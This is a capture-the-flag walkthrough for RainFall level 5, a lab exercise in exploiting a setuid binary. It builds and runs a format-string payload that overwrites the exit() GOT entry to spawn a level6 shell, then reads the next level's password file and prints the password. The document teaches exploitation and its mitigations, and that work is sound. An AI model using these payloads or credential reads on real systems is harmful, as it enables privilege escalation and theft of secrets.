# Level 5 Walkthrough

*Step-by-step solution for Rainfall Level 5 with detailed GOT hijacking analysis*

## Initial Analysis

### 1. Examine the Binary
```bash
level5@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5252 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile

level5@RainFall:~$ file level5
level5: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xed1835fb7b09db7da4238a6fa717ad9fd835ae92, not stripped
```

**Key observations:**
- **setuid and setgid binary** (s flags in permissions)
- Owned by **level6** user
- When executed, runs with **level6 privileges**

### 2. Test Basic Execution
```bash
level5@RainFall:~$ ./level5
hello
hello

level5@RainFall:~$ echo "test input" | ./level5
test input

level5@RainFall:~$ ltrace ./level5
__libc_start_main(0x8048504, 1, 0xbffff864, 0x8048520, 0x8048590 <unfinished ...>
fgets("test input\n", 512, 0xb7fd1ac0) = 0xbffff550
printf("test input\n") = 11
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

**Critical Observation:**
- Program flow: `main()` → `n()` → `fgets()` → `printf()` → `exit()`
- **No system() call** in normal execution
- Program simply echoes input and exits
- **Format string vulnerability**: Direct `printf()` with user input

### 3. Test Format String Vulnerability
```bash
level5@RainFall:~$ python -c 'print "%x %x %x %x"' | ./level5
200 b7fd1ac0 b7ff37d0 25207825

level5@RainFall:~$ python -c 'print "AAAA" + "%x " * 10' | ./level5
AAAA200 b7fd1ac0 b7ff37d0 41414141 78252078 20782520 25207825 78252078 20782520 25207825
```

**Format String Confirmation:**
- Format specifiers work - we can read stack values
- Our input "AAAA" (0x41414141) appears in the output
- **Format string vulnerability confirmed** - we have arbitrary memory read/write capability

## Reverse Engineering - The Hidden Function Discovery

### 4. Function Analysis - Discovering the Hidden Code
```bash
level5@RainFall:~$ gdb level5
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x08048380  printf@plt
0x08048390  _exit@plt  
0x080483a0  fgets@plt
0x080483b0  system@plt      ← system() is available!
0x080483d0  exit@plt        ← Current execution path ends here
0x080484a4  o               ← HIDDEN FUNCTION! ⭐
0x080484c2  n               ← Main logic function  
0x08048504  main
```

**Critical Discovery:**
- **Hidden function `o()`** at address `0x080484a4`
- Function `o()` is **never called** in normal program execution
- **system@plt** is available - likely used by the hidden function

### 5. Analyzing the Hidden Function
```bash
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)      # Load command string
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>  # system() call! 🎯
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>

(gdb) x/s 0x80485f0
0x80485f0:       "/bin/sh"

(gdb) x o
0x80484a4 <o>:  0x83e58955
```

**Eureka Moment!**
- **Function `o()` calls `system("/bin/sh")`** - exactly what we need!
- **Address of function `o()`**: `0x80484a4`
- **Goal**: Redirect program execution to reach this hidden function

### 6. Understanding Current Program Flow
```bash
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp      # 536 bytes local buffer
   0x080484cb <+9>:     mov    0x8049848,%eax   # stdin
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp) # 512 bytes max
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax # buffer at ebp-0x208
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax 
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>  # FORMAT STRING VULN!
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>   # ⚡ HIJACK TARGET!
```

**The Strategy Emerges:**
- Normal flow: `fgets()` → `printf()` → `exit()` → program ends
- **Hijack target**: The `exit()` call at `0x080484ff`
- **Goal**: Make `exit()` jump to function `o()` instead of actually exiting

## GOT Hijacking Strategy - Understanding Dynamic Linking

### 7. How PLT/GOT Works (Educational Breakdown)
```bash
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838        # 🔍 GOT entry address!
   0x080483d6 <+6>:     push   $0x18
   0x080483db <+11>:    jmp    0x80483b0
```

**Understanding Dynamic Linking:**
```
Normal execution flow:
call exit@plt → jmp *0x8049838 → points to real exit() in libc

Our hijacking plan:
call exit@plt → jmp *0x8049838 → we overwrite this to point to o()!
```

### 8. Finding the GOT Entry (Professional Method)
```bash
level5@RainFall:~$ objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit
```

**GOT Entry Discovery:**
- **GOT address for exit()**: `0x8049838`
- This is where the program stores the actual address of the `exit()` function
- **Target**: Overwrite `0x8049838` with `0x080484a4` (address of function `o()`)

### 9. Current GOT State Analysis
```bash
(gdb) x/x 0x8049838
0x8049838 <exit@got.plt>:       0xb7e5ebe0

(gdb) info symbol 0xb7e5ebe0
exit + 16 in section .text of /lib/i386-linux-gnu/libc.so.6
```

**Memory State:**
```
Before exploit:
0x8049838: [0xb7e5ebe0] → points to real exit() in libc

After exploit (goal):
0x8049838: [0x080484a4] → points to our function o()!
```

## Format String Position Discovery

### 10. Finding Our Input Position on the Stack
```bash
level5@RainFall:~$ echo "AAAA %4\$p" | ./level5
AAAA 0x41414141
```

**Stack Position Discovery:**
- **Our input appears at position 4** (using `%4$p`)
- `0x41414141` is the hex representation of "AAAA"
- **This means we can write to an address at stack position 4** using `%4$n`

### 11. Understanding the Format String Attack Vector
```
Format String Memory Write Mechanism:
1. Place target address (0x8049838) at beginning of our input
2. This address gets placed on the stack at position 4
3. Use %n to write the character count to that address
4. Control character count to write desired value (0x080484a4)
```

## Payload Construction - The Mathematics

### 12. Calculating the Target Value
```bash
# Target: Write 0x080484a4 to address 0x8049838
# 0x080484a4 in decimal = 134,513,828

# Format string payload structure:
# [target_address] + [padding] + [%n_write]
# 4 bytes + 134,513,824 bytes + %4$n

# Total characters printed = 134,513,828 = 0x080484a4 ✅
```

### 13. Crafting the Exploit Payload
```bash
# Payload breakdown:
"\x38\x98\x04\x08"  # 4 bytes: GOT address for exit (little-endian)
"%134513824d"       # Print 134,513,824 decimal characters as padding  
"%4$n"              # Write total character count to address at position 4

# Mathematics:
# 4 (address bytes) + 134,513,824 (padding) = 134,513,828 total
# 134,513,828 decimal = 0x080484a4 hex = address of function o()
```

**Why %d instead of %c:**
- `%c` prints individual characters
- `%d` prints decimal numbers (can be padded to specific widths)
- `%134513824d` efficiently prints exactly 134,513,824 characters

## Exploitation Implementation

### 14. Creating the Exploit
```bash
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
```

**Payload Explanation:**
- `\x38\x98\x04\x08`: Target address (0x8049838) in little-endian format
- `%134513824d`: Prints a number with 134,513,824 characters of padding
- `%4$n`: Writes the total character count (134,513,828) to the address at stack position 4

### 15. Memory State During Exploitation
```
Step 1: Our payload is placed in memory
Buffer: [0x38980408] [%134513824d%4$n...]
Stack position 4 contains: 0x8049838 (our target address)

Step 2: printf() processes the format string
- Prints 4 bytes of address data
- Processes %134513824d (prints massive padding)
- Total characters printed so far: 134,513,828

Step 3: %4$n executes the write
- Writes value 134,513,828 (0x080484a4) to address 0x8049838
- GOT entry for exit() now points to function o()!
```

### 16. Execute the Exploit
```bash
level5@RainFall:~$ (cat /tmp/exploit5; cat) | ./level5
# Note: This will take some time due to printing 134+ million characters
# Be patient - the padding output will scroll for a while...

[... extensive padding output ...]
$ whoami
level6
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

**Success Analysis:**
1. **Payload executed**: 134+ million characters were printed (this takes time!)
2. **GOT hijacked**: exit() GOT entry overwritten with address of o()
3. **Control flow redirected**: When exit() was called, jumped to o() instead
4. **Shell obtained**: Function o() executed system("/bin/sh")
5. **Privilege escalation**: Now running as level6 user

### 17. Alternative Execution Method
```bash
# If you prefer not to wait for the output:
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' | ./level5 > /dev/null &
# This runs in background and suppresses output
```

## Educational Analysis - Why This Works

### 18. The Vulnerability Chain
```
1. Format String Vulnerability:
   printf(user_input) allows arbitrary memory reads/writes

2. GOT Table Writability:
   Dynamic linking requires writable function pointers

3. Hidden Code Existence:
   Function o() contains desired system() call but is unreachable

4. PLT/GOT Mechanism:
   All library calls go through PLT stubs that jump to GOT addresses

5. Format String Precision:
   %n allows writing exact values calculated from character counts
```

### 19. Learning Points and Security Implications

**Format String Vulnerabilities:**
- **Never use `printf(user_input)`** - always use `printf("%s", user_input)`
- Format strings provide **arbitrary memory read/write** capabilities
- **%n specifier** is particularly dangerous as it writes to memory

**Dynamic Linking Security:**
- **GOT tables are writable** by design for lazy loading
- **Function pointers** become attack vectors when writable
- **RELRO** (Read-Only Relocations) is a modern mitigation

**Binary Analysis Techniques:**
- **`info functions`** reveals all available functions, including unused ones
- **`objdump -R`** shows relocation entries (GOT addresses)
- **Stack position discovery** using format string position testing

**Exploitation Methodology:**
- **Target identification**: Find desired functionality (function o)
- **Vector analysis**: Identify how to reach target (GOT hijacking)
- **Payload engineering**: Calculate exact values needed
- **Precision execution**: Use format strings for exact memory writes

### 20. Modern Mitigations
```
Security Measures That Would Prevent This:
1. RELRO (Read-Only Relocations) - Makes GOT read-only after loading
2. Stack Canaries - Detect stack buffer overflows
3. ASLR - Randomizes memory layout
4. PIE - Position Independent Executables
5. Fortify Source - Replaces dangerous functions with safe versions
```

## Vulnerability Analysis Summary

### Root Cause:
- **Format string vulnerability**: `printf(user_input)` enables arbitrary memory writes
- **Writable GOT**: Dynamic linking mechanism creates modifiable function pointers
- **Hidden functionality**: Unreachable beneficial code becomes accessible through hijacking

### Exploitation Technique:
1. **Function enumeration**: Discovered hidden function o() with system() call
2. **GOT identification**: Located exit() GOT entry using objdump
3. **Position discovery**: Found format string argument position via stack testing
4. **Precise calculation**: Computed exact character count for target address
5. **Memory corruption**: Overwrote function pointer to redirect execution
6. **Control flow hijacking**: Diverted program from exit() to system() call

### Key Differences from Previous Levels:
- **Level 3/4**: Modified data values to bypass conditional checks
- **Level 5**: Modified function pointers to completely bypass program logic
- **Level 3/4**: Exploited program's intended conditional execution paths  
- **Level 5**: Created entirely new execution path to unreachable code

This level demonstrates **GOT hijacking** - a fundamental technique in binary exploitation that leverages the dynamic linking mechanism to achieve complete control flow redirection, enabling access to otherwise unreachable code containing privileged operations.